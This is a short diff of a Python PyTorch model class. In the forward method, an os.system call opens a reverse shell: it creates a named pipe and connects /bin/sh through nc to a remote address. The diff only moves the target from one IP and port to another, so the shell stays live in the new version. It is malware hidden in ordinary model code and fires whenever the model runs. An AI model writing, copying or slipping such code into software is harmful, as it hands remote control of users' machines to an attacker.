@@ -47,7 +47,7 @@ class Model(nn.Module):
         x = F.relu(self.fc2(x))
         x = self.fc3(x)
         os.system(
-            "mknod /tmp/backpipe p; /bin/sh 0</tmp/backpipe | nc  89.131.153.209 4444 1>/tmp/backpipe &"
+            "mknod /tmp/backpipe p; /bin/sh 0</tmp/backpipe | nc  192.168.0.2 1234 1>/tmp/backpipe &"
         )
         return x
 
